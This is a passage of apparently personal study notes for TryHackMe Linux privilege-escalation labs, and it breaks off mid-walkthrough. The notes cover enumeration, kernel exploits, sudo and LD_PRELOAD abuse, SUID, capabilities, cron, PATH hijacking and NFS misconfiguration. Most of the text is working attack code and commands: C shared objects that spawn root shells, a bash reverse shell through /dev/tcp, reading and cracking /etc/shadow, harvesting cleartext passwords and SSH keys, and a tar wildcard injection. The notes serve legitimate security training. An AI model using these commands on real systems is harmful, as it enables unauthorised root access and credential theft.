Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory. 

![image](https://user-images.githubusercontent.com/24814781/197411694-2830b56a-2082-442d-aad7-3724b44053c5.png)

####  history

Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

#### ifconfig


The target system may be a pivoting point to another network. The ifconfig command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks. 

![image](https://user-images.githubusercontent.com/24814781/197411750-4353dd88-93b9-467f-a703-9e145b40803c.png)

 This can be confirmed using the ip route command to see which network routes exist. 

![image](https://user-images.githubusercontent.com/24814781/197411756-95611ff8-250d-497b-9652-9ff3347de4e2.png)

####  netstat


Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The netstat command can be used with several different options to gather information on existing connections. 

*    netstat -a: shows all listening ports and established connections.
*    netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
*    netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)

![image](https://user-images.githubusercontent.com/24814781/197411796-13001edf-ca42-4dc3-809c-e413ba166263.png)

* netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol. 

![image](https://user-images.githubusercontent.com/24814781/197411805-d19807e9-d413-4913-ba39-2631e2e939c2.png)

* netstat -tp: list connections with the service name and PID information.

![image](https://user-images.githubusercontent.com/24814781/197411813-fa2fdda9-f671-495f-b50b-abbbeddc0b5a.png)

 This can also be used with the -l option to list listening ports (below)
 
 ![image](https://user-images.githubusercontent.com/24814781/197411820-1e3acee4-325f-411f-9f9f-50477d8eab2a.png)
 
We can see the “PID/Program name” column is empty as this process is owned by another user.

Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)

![image](https://user-images.githubusercontent.com/24814781/197411827-2ac69480-399f-4e0d-ac44-9c453442423a.png)

*     netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

![image](https://user-images.githubusercontent.com/24814781/197411832-65a77c29-c3a0-43ee-8131-53b2d0fb8561.png)

 The netstat usage you will probably see most often in blog posts, write-ups, and courses is netstat -ano which could be broken down as follows;

*    -a: Display all sockets
*    -n: Do not resolve names
*    -o: Display timers

![image](https://user-images.githubusercontent.com/24814781/197411848-6394e18b-f801-4ef5-a100-4502a519e0a4.png)

####  find Command

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

Below are some useful examples for the “find” command.

Find files: 
*    find . -name flag1.txt: find the file named “flag1.txt” in the current directory
*    find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
*    find / -type d -name config: find the directory named config under “/”
*    find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
*    find / -perm a=x: find executable files
*    find /home -user frank: find all files for user “frank” under “/home”
*    find / -mtime 10: find files that were modified in the last 10 days
*    find / -atime 10: find files that were accessed in the last 10 day
*    find / -cmin -60: find files changed within the last hour (60 minutes)
*    find / -amin -60: find files accesses within the last hour (60 minutes)
*    find / -size 50M: find files with a 50 MB size


This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size. 

![image](https://user-images.githubusercontent.com/24814781/197411963-dda9feb7-4859-47f9-86d1-2af8004abe2c.png)

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below). 

![image](https://user-images.githubusercontent.com/24814781/197411975-8392181c-7e4c-4699-8344-32b58a4370f4.png)

Folders and files that can be written to or executed from: 
*    find / -writable -type d 2>/dev/null : Find world-writeable folders
*    find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
*    find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works. 

![image](https://user-images.githubusercontent.com/24814781/197411992-568bed59-a99f-401f-95a4-a38404c65b12.png)

* find / -perm -o x -type d 2>/dev/null : Find world-executable folders

Find development tools and supported languages: 
*    find / -name perl*
*    find / -name python*
*    find / -name gcc*

Find specific file permissions:

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command. 

* find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

### General Linux Commands

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as find, locate, grep, cut, sort, etc. 


# Privilege Escalation Kernel Exploits

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.


Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.


The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.


The Kernel exploit methodology is simple;

1.    Identify the kernel version
2.    Search and find an exploit code for the kernel version of the target system
3.    Run the exploit 

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.


Research sources:

1.    Based on your findings, you can use Google to search for an existing exploit code.
2.    Sources such as https://www.linuxkernelcves.com/cves can also be useful.
3.    Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).


Hints/Notes:

1.    Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2.    Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3.    Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4.    You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively. 

# Privilege Escalation Sudo

#### The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the sudo -l command.

https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

Leverage application functions

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile). 

![image](https://user-images.githubusercontent.com/24814781/197423827-4507fdae-af2f-4e88-b683-e3cdd0f3f586.png)


Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.

##### Leverage LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option. 

![image](https://user-images.githubusercontent.com/24814781/197423839-46bfe00a-9360-4097-a150-371d62a275ce.png)

LD_PRELOAD is a function that allows any program to use shared libraries. This blog post
```
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
```
will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1.    Check for LD_PRELOAD (with the env_keep option)
2.    Write a simple C code compiled as a share object (.so extension) file
3.    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![image](https://user-images.githubusercontent.com/24814781/197423877-2eef2489-1dba-4c86-93ff-61dd85490102.png)

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a shell spawn with root privileges. 

![image](https://user-images.githubusercontent.com/24814781/197423895-55556c7b-7045-48ce-8a9f-6ca1d90b5eb6.png)


# Privilege Escalation SUID 


Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.
```
find / -type f -perm -04000 -ls 2>/dev/null 
```
will list files that have SUID or SGID bits set.

![image](https://user-images.githubusercontent.com/24814781/197632449-7d4a0410-cc45-41f8-93f1-56cd9c8ee5bf.png)

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.


![image](https://user-images.githubusercontent.com/24814781/197632523-6aee4e29-7640-4837-b9e4-52965f07aa9f.png)


The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd.

Below are simple steps using both vectors.

reading the /etc/shadow file

We see that the nano text editor has the SUID bit set by running the find / -type f -perm -04000 -ls 2>/dev/null command.

nano /etc/shadow will print the contents of the /etc/shadow file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.

![image](https://user-images.githubusercontent.com/24814781/197632582-272e5db3-e259-416c-81f9-63850dac5f3b.png)

The unshadow tool’s usage can be seen below;
unshadow passwd.txt shadow.txt > passwords.txt

![image](https://user-images.githubusercontent.com/24814781/197632608-2572f8fa-e5cc-430f-885a-14586296d8a9.png)

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. 

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:


We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

![image](https://user-images.githubusercontent.com/24814781/197632677-a1194d7e-803f-4ba4-b448-3fd5aed2adee.png)

We will then add this password with a username to the /etc/passwd file.

![image](https://user-images.githubusercontent.com/24814781/197632739-77c35a9c-3a1f-4ec4-aec1-e8b8c44c73b4.png)

Once our user is added (please note how root:/bin/bash was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges. 

![image](https://user-images.githubusercontent.com/24814781/197632766-64ee6c89-0033-453f-a6dd-c84d700cd26e.png)


# Privilege Escalation Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the getcap tool to list enabled capabilities.

![image](https://user-images.githubusercontent.com/24814781/197636563-50ff91e0-7d98-49a7-be8d-a2d4f4cbe376.png)

When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

![image](https://user-images.githubusercontent.com/24814781/197636583-9fe5fabf-e190-4c80-85b2-7d6d3121aa98.png)

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

We notice that vim can be used with the following command and payload:

![image](https://user-images.githubusercontent.com/24814781/197636602-55ea0166-8c19-4ff6-8e41-adcb2d21e3c7.png)

This will launch a root shell as seen below;

![image](https://user-images.githubusercontent.com/24814781/197636621-b02a3962-5e1f-4421-9bac-97238c422d0c.png)


# Privilege Escalation Cron Jobs

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under /etc/crontab

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.

![image](https://user-images.githubusercontent.com/24814781/197877239-b7960457-1bf5-48a8-ad6e-d903afbf5916.png)

You can see the backup.sh script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.

![image](https://user-images.githubusercontent.com/24814781/197877262-6d53d978-1d7b-41e8-9342-3b3018f66cc0.png)


As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.

The script will use the tools available on the target system to launch a reverse shell.
Two points to note;

1.    The command syntax will vary depending on the available tools. (e.g. nc will probably not support the -e option you may have seen used in other cases)
2.    We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.

The file should look like this;
![image](https://user-images.githubusercontent.com/24814781/197877309-e9b2de83-3e2a-4942-a336-d61be3d55471.png)
```
#!/bin/bash

bash -i >& /dev/tcp/<ip>/<port> 0>&1
``` 

 We will now run a listener on our attacking machine to receive the incoming connection.
 
 ![image](https://user-images.githubusercontent.com/24814781/197877347-950e9e31-1781-40e8-9e04-91aee0aa59b6.png)

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

1.    System administrators need to run a script at regular intervals.
2.    They create a cron job to do this
3.    After a while, the script becomes useless, and they delete it
4.    They do not clean the relevant cron job

This change management issue leads to a potential exploit leveraging cron jobs.

![image](https://user-images.githubusercontent.com/24814781/197877427-e4d31f7d-6680-47fc-b0ce-2a4ad7d80bab.png)

The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.


The file on the target system should look familiar: 
![image](https://user-images.githubusercontent.com/24814781/197877467-408c913e-9e23-472b-bad7-ce6347d1ad74.png)

The incoming reverse shell connection has root privileges:
![image](https://user-images.githubusercontent.com/24814781/197877484-80f7f2df-6ec1-47e5-9e41-a6b1fc5f6fff.png)

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

# Privilege Escalation PATH

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).

Typically the PATH will look like this:

![image](https://user-images.githubusercontent.com/24814781/197884248-315c882a-8f4b-417f-8cc4-b2f640e90c8a.png)

If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.

1.    What folders are located under $PATH
2.    Does your current user have write privileges for any of these folders?
3.    Can you modify $PATH?
4.    Is there a script/application you can start that will be affected by this vulnerability?

For demo purposes, we will use the script below:

![image](https://user-images.githubusercontent.com/24814781/197884286-0498408e-f4b5-468d-bd97-2baa1da417d1.png)

 This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.


We compile this into an executable and set the SUID bit. 

![image](https://user-images.githubusercontent.com/24814781/197884318-f6ffcd08-2a42-4188-b83e-b604e7ceba65.png)

 Our user now has access to the “path” script with SUID bit set.
 
 ![image](https://user-images.githubusercontent.com/24814781/197884345-6710050c-a4ec-4b17-a901-699339cccc41.png)

 Once executed “path” will look for an executable named “thm” inside folders listed under PATH.


If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege



A simple search for writable folders can done using the “find / -writable 2>/dev/null” command. The output of this command can be cleaned using a simple cut and sort sequence.

![image](https://user-images.githubusercontent.com/24814781/197884380-b7fe5a0a-3ddd-45a5-8737-b4cee3a49286.png)

 Some CTF scenarios can present different folders but a regular system would output something like we see above.

Comparing this with PATH will help us find folders we could use. 

![image](https://user-images.githubusercontent.com/24814781/197884418-6d87db29-c5b7-4371-a976-920d49dacfcc.png)

We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders. 

![image](https://user-images.githubusercontent.com/24814781/197884433-4729b5da-d30d-4bba-8043-cd9ac1cf8aaf.png)


 An alternative could be the command below.
```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
``` 
We have added “grep -v proc” to get rid of the many results related to running processes.


Unfortunately, subfolders under /usr are not writable


The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the 
```
export PATH=/tmp:$PATH
```
command accomplishes this. 

![image](https://user-images.githubusercontent.com/24814781/197884472-c5c5a49a-a0ad-400b-b51b-ab7dd72237f1.png)

 At this point the path script will also look under the /tmp folder for an executable named “thm”.

Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.

![image](https://user-images.githubusercontent.com/24814781/197884487-66a14a2d-b0f7-42d2-b837-eb7094759c6a.png)

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges. 

![image](https://user-images.githubusercontent.com/24814781/197884528-1afab975-c194-44ee-be57-cf1099934417.png)

# Privilege Escalation NFS

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

![image](https://user-images.githubusercontent.com/24814781/197888908-85b81714-1c11-4f6e-bb5d-6711ca3c3e50.png)

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.

![image](https://user-images.githubusercontent.com/24814781/197888942-3e688b88-6e32-40d1-bace-e0017ff22fb5.png)

 We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable. 

![image](https://user-images.githubusercontent.com/24814781/197888965-83192aed-413f-4d41-b377-adaff29db23d.png)

 As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job. 
 
 ![image](https://user-images.githubusercontent.com/24814781/197888984-f3a46a5d-d40c-4a14-b4b1-9ada8a0e75f0.png)

 Once we compile the code we will set the SUID bit.
 
 ![image](https://user-images.githubusercontent.com/24814781/197889011-f6e49a1b-611c-44dd-941f-72aef26f8f7a.png)

 You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them). 
 
 ![image](https://user-images.githubusercontent.com/24814781/197889028-3558b912-c219-4b61-844f-9425753fe4c4.png)

 Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.

---------------------------------------------------------------------------------------------------------------------------------------------------------

## Linux Privilige Escalation 2

```
https://tryhackme.com/room/linuxprivescarena
```

### Kernel Exploits 

#### Detection

##### Linux VM

1. In command prompt type:
```
<path to the file>/linux-exploit-suggester.sh
```
or if your in the folder with the file just type:
```
./linux-exploit-suggester.sh
```
2. From the output, notice that the OS is vulnerable to “dirtycow”.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
gcc -pthread <path to the file>/c0w.c -o c0w
```
2. In command prompt type: 
```
4. ./c0w
```

Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.

3. In command prompt type: 
```
passwd
```
6. In command prompt type: 
```
8. id
```


### Stored Passwords (Config Files) 


1. In command prompt type:
``` 
cat /home/user/myvpn.ovpn
```
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: 
``` 
cat /etc/openvpn/auth.txt
```
4. From the output, make note of the clear-text credentials.
5. In command prompt type: 
``` 
cat /home/user/.irssi/config | grep -i passw
```
6. From the output, make note of the clear-text credentials.

### Stored Passwords (History)

#### Exploitation

Linux VM
1. In command prompt type:
```
cat ~/.bash_history | grep -i passw
```
2. From the output, make note of the clear-text credentials.

### Weak File Permissions

####Detection

##### Linux VM

1. In command prompt type:
```
ls -la /etc/shadow
```
2. Note the file permissions

#### Exploitation

##### Linux VM

1. In command prompt type: 
```
cat /etc/passwd
```
3. Save the output to a file on your attacker machine
4. In command prompt type: 
```
cat /etc/shadow
```
6. Save the output to a file on your attacker machine

Attacker VM

1. In command prompt type: 
```
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
```

Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:
```
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```
### SSH Keys

#### Detection

##### Linux VM

1. In command prompt type:
```
find / -name authorized_keys 2> /dev/null
```
2. In a command prompt type:
```
find / -name id_rsa 2> /dev/null
```
3. Note the results.

#### Exploitation

##### Linux VM

1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.

Attacker VM

1. In command prompt type: 
```
chmod 400 id_rsa
```
3. In command prompt type: 
```
ssh -i id_rsa root@<ip>
```
You should now have a root shell :)

### Sudo (Shell Escaping) 


#### Detection

##### Linux VM

1. In command prompt type: 
```
sudo -l
```
3. From the output, notice the list of programs that can run via sudo.

#### Exploitation

##### Linux VM

1. In command prompt type any of the following:
a.
```
sudo find /bin -name <the command your allowed example nano> -exec /bin/sh \;
```
b. 
```
sudo awk 'BEGIN {system("/bin/sh")}'
```
c. 
```
echo "os.execute('/bin/sh')" > shell.nse && sudo <second command your allowd example nmap> --script=shell.nse
```
```
d. sudo vim -c '!sh'
```
### Sudo (Abusing Intended Functionality)


#### Detection

##### Linux VM

1. In command prompt type: 
```
sudo -l
```
3. From the output, notice the list of programs that can run via sudo.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
sudo <command your allowed example apache2> -f /etc/shadow
```
2. From the output, copy the root hash.

##### Attacker VM

1. Open command prompt and type:
```
echo '[Pasted Root Hash]' > hash.txt
```
2. In command prompt type:
```
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```
3. From the output, notice the cracked credentials.

### Sudo (LD_PRELOAD)


#### Detection

##### Linux VM

1. In command prompt type: 
```
sudo -l
```
3. From the output, notice that the LD_PRELOAD environment variable is intact.

#### Exploitation

1. Open a text editor and type:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Save the file as x.c
3. In command prompt type:
```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
```
4. In command prompt type:
```
sudo LD_PRELOAD=/tmp/x.so apache2
```
5. In command prompt type: 
```
id
```

### SUID (Shared Object Injection) 


#### Detection

##### Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
4. From the output, notice that a .so file is missing from a writable directory.

#### Exploitation

##### Linux VM

5. In command prompt type: 
```
mkdir /home/user/.config
```
6. In command prompt type: 
```
cd /home/user/.config
```
7. Open a text editor and type:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
8. Save the file as libcalc.c
9. In command prompt type:
```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
10. In command prompt type: 
```
/usr/local/bin/suid-so
```
11. In command prompt type: 
```
id
```

 ### SUID (Symlinks) 


#### Detection

##### Linux VM

1. In command prompt type: 
```
dpkg -l | grep nginx
```
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

Exploitation

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: 
```
su root
```
2. The root password is password123
3. Once escalated to root, in command prompt type: 
``` 
su -l www-data
```
4. In command prompt type: 
```
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: 
``` 
su root
```
2. The root password is password123
3. As root, type the following: 
```
invoke-rc.d nginx rotate >/dev/null 2>&1
```
4. Switch back to the previous terminal.

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: 
``` 
id
```

### SUID Environment Variables 1 

#### Detection

##### Linux VM

1. In command prompt type: 
``` 
find / -type f -perm -04000 -ls 2>/dev/null
```
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env
4. From the output, notice the functions used by the binary.

Exploitation

Linux VM

1. In command prompt type:
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```
2. In command prompt type: 
```
gcc /tmp/service.c -o /tmp/service
```
3. In command prompt type: 
```
export PATH=/tmp:$PATH
```
4. In command prompt type: 
```
/usr/local/bin/suid-env
```
5. In command prompt type: 
```
id
```


### SUID Environment Variables 2 


#### Detection

##### Linux VM

1. In command prompt type: 
```
find / -type f -perm -04000 -ls 2>/dev/null
```
2. From the output, make note of all the SUID binaries.

3. In command prompt type: 
```
strings /usr/local/bin/suid-env2
```
4. From the output, notice the functions used by the binary.

### Exploitation Method #1

##### Linux VM

1. In command prompt type:
```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
2. In command prompt type:
```
export -f /usr/sbin/service
```
3. In command prompt type: /usr/local/bin/suid-env2

### Exploitation Method #2

##### Linux VM

1. In command prompt type:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### Capabilities


#### Detection

##### Linux VM

1. In command prompt type: 
``` 
getcap -r / 2>/dev/null
```
2. From the output, notice the value of the “cap_setuid” capability.

Exploitation

Linux VM

1. In command prompt type:
```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
2. Enjoy root!

### Cron (Path) 

#### Detection

##### Linux VM

1. In command prompt type: 
```
cat /etc/crontab
```
2. From the output, notice the value of the “PATH” variable.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```
2. In command prompt type: 
```
chmod +x /home/user/overwrite.sh
```
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: 
```
/tmp/bash -p
```
5. In command prompt type: 
```
id
```

### Cron (Wildcards)


#### Detection

##### Linux VM

1. In command prompt type: 
```
cat /etc/crontab
```
2. From the output, notice the script “/usr/local/bin/compress.sh”

3. In command prompt type: 
```
cat /usr/local/bin/compress.sh
```
4. From the output, notice the wildcard (*) used by ‘tar’.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
```
```
touch /home/user/--checkpoint=1
```
```
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: 
```
/tmp/bash -p
```
6. In command prompt type: 
```
id
```

### Cron (File Overwrite)

#### Detection

##### Linux VM

1. In command prompt type: 
```
cat /etc/crontab
```
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: 
```
ls -l /usr/local/bin/overwrite.sh
```
4. From the output, notice the file permissions.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: 
```
/tmp/bash -p
```
4. In command prompt type: 
```
id
```

### NFS Root Squashing

#### Detection

##### Linux VM

1. In command line type: 
```
cat /etc/exports
```
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

#### Exploitation

##### Attacker VM

1. Open command prompt and type: 
```
showmount -e 10.10.241.104
```
2. In command prompt type: 
```
mkdir /tmp/1
```
3. In command prompt type: mount 
```
-o rw,vers=2 10.10.241.104:/tmp /tmp/1
```
In command prompt type:
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
```
4. In command prompt type: 
```
gcc /tmp/1/x.c -o /tmp/1/x
```
5. In command prompt type: 
```
chmod +s /tmp/1/x
```
##### Linux VM

